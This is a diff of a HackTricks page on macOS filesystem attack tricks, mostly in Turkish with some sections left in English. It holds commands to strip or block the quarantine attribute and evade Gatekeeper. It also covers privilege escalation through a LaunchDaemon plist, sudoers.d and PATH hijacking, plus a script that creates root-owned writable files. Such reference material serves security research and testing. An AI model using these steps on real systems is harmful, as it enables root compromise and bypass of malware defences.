@@ -1,54 +1,55 @@
-# macOS FS İpuçları
+# macOS FS Tricks
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking ipuçlarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## POSIX izin kombinasyonları
 
-Bir **dizin** içindeki izinler:
+Bir **dizindeki** izinler:
 
-* **okuma** - dizin girdilerini **listeleyebilirsiniz**
-* **yazma** - dizinde **dosyaları silebilir/yazabilirsiniz** ve **boş klasörleri silebilirsiniz**.
-* Ancak **doluluk klasörlerini silemez/değiştiremezsiniz** yazma izniniz olmadıkça.
-* Bir klasörün adını **değiştiremezsiniz** sahip olmadıkça.
-* **çalıştırma** - dizini **gezebilmenize izin verilir** - bu hakkınız yoksa, içindeki dosyalara veya alt dizinlere erişemezsiniz.
+* **okuma** - dizin girişlerini **listeleyebilirsiniz**
+* **yazma** - dizindeki **dosyaları silip/yazabilirsiniz** ve **boş klasörleri** silebilirsiniz.
+* Ancak **boş olmayan klasörleri** silip/değiştiremezsiniz, yazma izinleriniz yoksa.
+* Bir klasörün adını **değiştiremezsiniz**, eğer ona sahip değilseniz.
+* **çalıştırma** - dizinde **geçiş yapmanıza izin verilir** - bu hakka sahip değilseniz, içindeki dosyalara veya alt dizinlere erişemezsiniz.
 
 ### Tehlikeli Kombinasyonlar
 
-**Root'a ait bir dosya/dizini nasıl üzerine yazabilirsiniz**, ancak:
+**Root tarafından sahip olunan bir dosya/klasörü nasıl üzerine yazılır**, ancak:
 
-* Yol üzerinde bir ebeveyn **dizin sahibi** kullanıcıdır
-* Yol üzerinde bir ebeveyn **dizin sahibi** bir **kullanıcı grubudur** ve **yazma erişimi** vardır
-* Bir kullanıcı **grubu**, **dosyaya yazma** erişimine sahiptir
+* Yolda bir ana **dizin sahibi** kullanıcıdır
+* Yolda bir ana **dizin sahibi** **kullanıcı grubu** **yazma erişimine** sahiptir
+* Bir kullanıcı **grubu** **dosyaya** **yazma** erişimine sahiptir
 
-Önceki kombinasyonlardan herhangi biriyle, bir saldırgan ayrıcalıklı keyfi yazma elde etmek için beklenen yola bir **sembolik/sabit bağ** enjekte edebilir.
+Önceki kombinasyonlardan herhangi biriyle, bir saldırgan **beklenen yola** bir **simetrik/sert bağlantı** **enjekte** edebilir ve ayrıcalıklı bir yazma elde edebilir.
 
-### Dizin kökü R+X Özel durum
+### Klasör root R+X Özel durumu
 
-Eğer bir **dizinde yalnızca root'un R+X erişimine sahip olduğu dosyalar varsa**, bu dosyalara **başka kimse erişemez**. Bu nedenle, bir kullanıcının okuyabileceği ancak bu **kısıtlama** nedeniyle okuyamayacağı bir dosyanın bu dizinden **başka bir dizine taşınmasına** izin veren bir zafiyet, bu dosyaları okumak için kötüye kullanılabilir.
+**Sadece root'un R+X erişimine sahip olduğu** bir **dizide** dosyalar varsa, bunlar **başka hiç kimseye erişilebilir değildir**. Bu nedenle, bir kullanıcının okuyabileceği bir dosyayı, bu **kısıtlama** nedeniyle okunamayan bir klasörden **farklı birine** **taşıma** izni veren bir güvenlik açığı, bu dosyaları okumak için kötüye kullanılabilir.
 
 Örnek: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)
 
-## Sembolik Bağlantı / Sabit Bağlantı
+## Sembolik Bağlantı / Sert Bağlantı
 
-Eğer ayrıcalıklı bir işlem, **daha düşük ayrıcalıklı bir kullanıcı tarafından kontrol edilebilecek bir dosyaya yazıyorsa**, veya daha önceden daha düşük ayrıcalıklı bir kullanıcı tarafından oluşturulmuşsa. Kullanıcı sadece bir Sembolik veya Sabit bağlantı aracılığıyla onu başka bir dosyaya **yönlendirebilir** ve ayrıcalıklı işlem o dosyaya yazacaktır.
+Eğer ayrıcalıklı bir işlem, **düşük ayrıcalıklı bir kullanıcı** tarafından **kontrol edilebilecek** veya daha düşük ayrıcalıklı bir kullanıcı tarafından **önceden oluşturulmuş** bir **dosyaya** veri yazıyorsa, kullanıcı sadece onu bir Sembolik veya Sert bağlantı aracılığıyla **başka bir dosyaya** **işaret edebilir** ve ayrıcalıklı işlem o dosyaya yazacaktır.
 
-Saldırganın ayrıcalıkları yükseltmek için keyfi yazmayı kötüye kullanabileceği diğer bölümlere bakın.
+Bir saldırganın **ayrıcalıkları artırmak için keyfi bir yazmayı nasıl kötüye kullanabileceğini** kontrol edin.
 
 ## .fileloc
 
-**`.fileloc`** uzantılı dosyalar, diğer uygulamalara veya ikili dosyalara işaret edebilir, bu nedenle açıldıklarında uygulama/ikili dosya yürütülecektir.\
+**`.fileloc`** uzantısına sahip dosyalar, diğer uygulamalara veya ikili dosyalara işaret edebilir, böylece açıldıklarında, çalıştırılacak olan uygulama/ikili dosya olacaktır.\
 Örnek:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -64,19 +65,19 @@ Saldırganın ayrıcalıkları yükseltmek için keyfi yazmayı kötüye kullana
 ```
 ## Keyfi FD
 
-Eğer bir **işlemi yüksek ayrıcalıklarla bir dosya veya klasör açmaya** zorlayabilirseniz, **`crontab`**'ı kullanarak `/etc/sudoers.d` içindeki bir dosyayı **`EDITOR=exploit.py`** ile açabilir ve böylece `exploit.py`, `/etc/sudoers` içindeki dosyaya FD alacak ve bunu kötüye kullanabilecektir.
+Eğer bir **işlemi yüksek ayrıcalıklarla bir dosya veya klasör açmaya zorlayabilirseniz**, **`crontab`**'i kullanarak `/etc/sudoers.d` içindeki bir dosyayı **`EDITOR=exploit.py`** ile açabilirsiniz, böylece `exploit.py` `/etc/sudoers` içindeki dosyaya FD alacak ve bunu kötüye kullanacaktır.
 
 Örneğin: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
-## Karantina xattrs hilelerinden kaçınma
+## Karantina xattrs hilelerinden kaçının
 
-### Kaldırma
+### Kaldırın
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
 ### uchg / uchange / uimmutable bayrağı
 
-Bir dosya/dizin bu değişmez özelliğe sahipse üzerine xattr eklemek mümkün olmayacaktır.
+Eğer bir dosya/klasör bu değişmez niteliğe sahipse, üzerine bir xattr koymak mümkün olmayacaktır.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -86,9 +87,9 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-### defvfs bağlama
+### defvfs mount
 
-Bir **devfs** bağlaması **xattr**'ı desteklemez, daha fazla bilgi için [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) bağlantısına bakın.
+Bir **devfs** montajı **xattr'ı desteklemez**, daha fazla bilgi için [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 ```bash
 mkdir /tmp/mnt
 mount_devfs -o noowners none "/tmp/mnt"
@@ -122,13 +123,13 @@ ls -le /tmp/test
 ```
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** dosya formatı, dosyayı ACE'leriyle birlikte kopyalar.
+**AppleDouble** dosya formatı, bir dosyayı ACE'leri ile birlikte kopyalar.
 
-[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) görülebileceği gibi, **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin temsili, sıkıştırılmış dosyada ACL olarak ayarlanacaktır. Dolayısıyla, bir uygulamayı diğer xattr'lerin yazılmasını engelleyen bir ACL ile AppleDouble dosya formatına sahip bir zip dosyasına sıkıştırırsanız... karantina xattr'ı uygulamaya ayarlanmaz:
+[**kaynak kodda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) görülebilir ki, xattr içinde saklanan ACL metin temsili **`com.apple.acl.text`** olarak adlandırılır ve bu, sıkıştırılmamış dosyada ACL olarak ayarlanacaktır. Yani, bir uygulamayı ACL ile birlikte **AppleDouble** dosya formatında bir zip dosyasına sıkıştırdıysanız ve bu ACL diğer xattr'ların yazılmasını engelliyorsa... karantina xattr'ı uygulamaya ayarlanmamıştı:
 
-Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) bakın.
+Daha fazla bilgi için [**orijinal raporu**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kontrol edin.
 
-Bunu çoğaltmak için önce doğru acl dizesini almalıyız:
+Bunu tekrarlamak için önce doğru acl dizesini almamız gerekiyor:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -146,9 +147,9 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
-(Not: Bu çalışsa bile kum havuzu xattr'yi yazmadan önce)
+(Not edin ki bu işe yarasa bile sandbox, karantina xattr'ını önceden yazar)
 
-Gerçekten gerekli değil ama her ihtimale karşı orada bırakıyorum:
+Gerçekten gerekli değil ama yine de burada bırakıyorum:
 
 {% content-ref url="macos-xattr-acls-extra-stuff.md" %}
 [macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
@@ -156,9 +157,9 @@ Gerçekten gerekli değil ama her ihtimale karşı orada bırakıyorum:
 
 ## Kod İmzalarını Atlatma
 
-Bundles, **`_CodeSignature/CodeResources`** dosyasını içerir ki bu dosya **bündle** içindeki her **dosyanın karmasını** içerir. CodeResources'un karması ayrıca **yürütülebilir dosyaya gömülüdür**, bu yüzden onunla oynayamayız.
+Paketler, **paket** içindeki her bir **dosyanın** **hash'ini** içeren **`_CodeSignature/CodeResources`** dosyasını içerir. CodeResources'ın hash'inin de **çalıştırılabilir dosyaya** **gömülü** olduğunu unutmayın, bu yüzden bununla da oynayamayız.
 
-Ancak, imzası kontrol edilmeyecek bazı dosyalar vardır, bunlar plist'te omit anahtarına sahiptir, örneğin:
+Ancak, imzasının kontrol edilmeyeceği bazı dosyalar vardır, bunlar plist'te omit anahtarına sahiptir, örneğin:
 ```xml
 <dict>
 ...
@@ -202,15 +203,17 @@ Ancak, imzası kontrol edilmeyecek bazı dosyalar vardır, bunlar plist'te omit 
 ...
 </dict>
 ```
-Aşağıdaki komutu kullanarak bir kaynağın imzasını CLI üzerinden hesaplamak mümkündür:
+Bir kaynağın imzasını CLI'dan hesaplamak mümkündür: 
 
 {% code overflow="wrap" %}
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
-## Dmg Dosyalarını Bağlama
+{% endcode %}
 
-Bir kullanıcı, hatta bazı mevcut klasörlerin üstüne bile özel içerik oluşturarak özel bir dmg dosyasını bağlayabilir. Özel içeriğe sahip özel bir dmg paketi nasıl oluşturabileceğinizi aşağıda bulabilirsiniz:
+## DMG'leri Bağla
+
+Bir kullanıcı, mevcut bazı klasörlerin üzerine bile oluşturulmuş özel bir dmg'yi bağlayabilir. Özel içerikle özel bir dmg paketi oluşturmanın yolu budur:
 
 {% code overflow="wrap" %}
 ```bash
@@ -235,20 +238,20 @@ hdiutil create -srcfolder justsome.app justsome.dmg
 ```
 {% endcode %}
 
-Genellikle macOS, diski `com.apple.DiskArbitrarion.diskarbitrariond` Mach hizmetiyle bağlar (`/usr/libexec/diskarbitrationd` tarafından sağlanır). Başlangıç Daemons plist dosyasına `-d` parametresini ekleyip yeniden başlatırsanız, logları `/var/log/diskarbitrationd.log` dosyasında saklar.\
-Ancak, `hdik` ve `hdiutil` gibi araçları kullanarak `com.apple.driver.DiskImages` kextiyle doğrudan iletişim kurmak mümkündür.
+Genellikle macOS, `com.apple.DiskArbitrarion.diskarbitrariond` Mach servisi ile diskleri monte eder (bu servis `/usr/libexec/diskarbitrationd` tarafından sağlanır). LaunchDaemons plist dosyasına `-d` parametresi eklenip yeniden başlatıldığında, `/var/log/diskarbitrationd.log` dosyasına günlükler kaydedilecektir.\
+Ancak, `com.apple.driver.DiskImages` kext'i ile doğrudan iletişim kurmak için `hdik` ve `hdiutil` gibi araçlar kullanılabilir.
 
-## Keyfi Yazma
+## Keyfi Yazmalar
 
 ### Periyodik sh betikleri
 
-Eğer betiğiniz bir **shell betiği** olarak yorumlanabilirse, her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell betiğini üzerine yazabilirsiniz.
+Eğer betiğiniz bir **shell script** olarak yorumlanabiliyorsa, her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell betiğini üzerine yazabilirsiniz.
 
-Bu betiğin sahte bir şekilde çalıştırılmasını sağlayabilirsiniz: **`sudo periodic daily`**
+Bu betiğin bir yürütmesini **şu şekilde** **taklit** edebilirsiniz: **`sudo periodic daily`**
 
 ### Daemonlar
 
-Keyfi bir **LaunchDaemon** yazın, örneğin **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** adında bir plist dosyası oluşturun ve keyfi bir betiği çalıştıran bir plist ekleyin:
+Keyfi bir **LaunchDaemon** yazın, örneğin **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** ve keyfi bir betik yürüten bir plist ile oluşturun:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -265,19 +268,21 @@ Keyfi bir **LaunchDaemon** yazın, örneğin **`/Library/LaunchDaemons/xyz.hackt
 </dict>
 </plist>
 ```
-### Sudoers Dosyası
+Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
 
-Eğer **keyfi yazma** yetkiniz varsa, kendinize **sudo** ayrıcalıkları veren bir dosya oluşturabilirsiniz. Bu dosyayı **`/etc/sudoers.d/`** klasörü içine oluşturabilirsiniz.
+### Sudoers File
 
-### PATH dosyaları
+If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
 
-**`/etc/paths`** dosyası, PATH ortam değişkenini dolduran ana yerlerden biridir. Üzerine yazmak için root olmanız gerekir, ancak bir **yetkili işlem** tarafından **tam yol olmadan komut** çalıştırılıyorsa, bu dosyayı değiştirerek onu **ele geçirebilirsiniz**.
+### PATH files
 
-`PATH` ortam değişkenine yeni klasörler yüklemek için **`/etc/paths.d`** içine dosyalar da yazabilirsiniz.
+The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
 
-## Diğer kullanıcılar olarak yazılabilir dosyalar oluşturma
+You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
 
-Bu, benim tarafımdan yazılabilir olan ancak root'a ait bir dosya oluşturacaktır ([**buradan kod**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Bu ayrıca bir ayrıcalık yükseltme olarak da çalışabilir.
+## Generate writable files as other users
+
+This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). This might also work as privesc:
 ```bash
 DIRNAME=/usr/local/etc/periodic/daily
 
@@ -291,7 +296,7 @@ echo $FILENAME
 ```
 ## POSIX Paylaşılan Bellek
 
-**POSIX paylaşılan bellek**, POSIX uyumlu işletim sistemlerindeki işlemlerin ortak bir bellek alanına erişmesine olanak tanır, diğer işlemler arası iletişim yöntemlerine kıyasla daha hızlı iletişimi kolaylaştırır. Bu, `shm_open()` ile bir paylaşılan bellek nesnesi oluşturup veya açarak başlar, ardından `ftruncate()` ile boyutunu ayarlar ve `mmap()` kullanarak bu belleği işlemin adres alanına eşler. İşlemler daha sonra bu bellek alanından doğrudan okuma ve yazma yapabilir. Eşzamanlı erişimi yönetmek ve veri bozulmasını önlemek için genellikle mutexler veya semaforlar gibi senkronizasyon mekanizmaları kullanılır. Son olarak, işlemler paylaşılan belleği `munmap()` ve `close()` ile kapatır ve opsiyonel olarak bellek nesnesini `shm_unlink()` ile kaldırabilir. Bu sistem, birden fazla işlemin paylaşılan verilere hızlı bir şekilde erişmesi gereken ortamlarda etkili bir şekilde hızlı IPC için özellikle etkilidir.
+**POSIX paylaşılan bellek**, POSIX uyumlu işletim sistemlerinde süreçlerin ortak bir bellek alanına erişmesine olanak tanır ve bu, diğer süreçler arası iletişim yöntemlerine kıyasla daha hızlı iletişim sağlar. Bu, `shm_open()` ile bir paylaşılan bellek nesnesi oluşturmayı veya açmayı, `ftruncate()` ile boyutunu ayarlamayı ve `mmap()` kullanarak sürecin adres alanına haritalamayı içerir. Süreçler daha sonra bu bellek alanından doğrudan okuma ve yazma yapabilirler. Eşzamanlı erişimi yönetmek ve veri bozulmasını önlemek için genellikle mutexler veya semaforlar gibi senkronizasyon mekanizmaları kullanılır. Son olarak, süreçler paylaşılan belleği `munmap()` ve `close()` ile haritalamayı kaldırır ve kapatır ve isteğe bağlı olarak bellek nesnesini `shm_unlink()` ile kaldırır. Bu sistem, birden fazla sürecin paylaşılan verilere hızlı bir şekilde erişmesi gereken ortamlarda verimli, hızlı IPC için özellikle etkilidir.
 
 <details>
 
@@ -343,7 +348,7 @@ return 0;
 
 <details>
 
-<summary>Tüketici Kodu Örneği</summary>
+<summary>Tüketici Kod Örneği</summary>
 ```c
 // gcc consumer.c -o consumer -lrt
 #include <fcntl.h>
@@ -387,28 +392,29 @@ return 0;
 
 ## macOS Korunan Tanımlayıcılar
 
-**macOS korunan tanımlayıcılar**, macOS'ta tanıtılan bir güvenlik özelliğidir ve kullanıcı uygulamalarındaki **dosya tanımlayıcı işlemlerinin** güvenliğini ve güvenilirliğini artırmayı amaçlar. Bu korunan tanımlayıcılar, dosya tanımlayıcılarıyla belirli kısıtlamaları veya "korumaları" ilişkilendirmenin bir yolunu sağlar ve bu kısıtlamalar çekirdek tarafından uygulanır.
+**macOS korunan tanımlayıcılar**, kullanıcı uygulamalarındaki **dosya tanımlayıcı işlemlerinin** güvenliğini ve güvenilirliğini artırmak için macOS'ta tanıtılan bir güvenlik özelliğidir. Bu korunan tanımlayıcılar, dosya tanımlayıcılarıyla belirli kısıtlamalar veya "korumalar" ilişkilendirme yolu sağlar ve bu kısıtlamalar çekirdek tarafından uygulanır.
 
-Bu özellik, özellikle **izin verilmeyen dosya erişimi** veya **yarış koşulları** gibi belirli güvenlik açıklarının önlenmesi için oldukça faydalıdır. Bu açıklıklar, örneğin bir iş parçacığının **başka bir savunmasız iş parçacığına erişim sağladığında** veya bir dosya tanımlayıcısının bir savunmasız çocuk işlem tarafından **devralındığında** meydana gelir. Bu işlevselliğe ilişkin bazı işlevler şunlardır:
+Bu özellik, **yetkisiz dosya erişimi** veya **yarış koşulları** gibi belirli güvenlik açıklarının önlenmesi için özellikle faydalıdır. Bu güvenlik açıkları, örneğin bir iş parçacığı bir dosya tanımına erişirken **başka bir savunmasız iş parçacığına erişim vermesi** veya bir dosya tanımlayıcısının **savunmasız bir çocuk süreç tarafından devralınması** durumunda ortaya çıkar. Bu işlevsellikle ilgili bazı fonksiyonlar şunlardır:
 
 * `guarded_open_np`: Bir koruma ile FD açar
 * `guarded_close_np`: Kapatır
-* `change_fdguard_np`: Bir tanımlayıcı üzerinde koruma bayraklarını değiştirir (koruma korumasını kaldırmak dahil)
+* `change_fdguard_np`: Bir tanımlayıcı üzerindeki koruma bayraklarını değiştirir (koruma kaldırma dahil)
 
 ## Referanslar
 
 * [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)
 
+{% hint style="success" %}
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
-* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
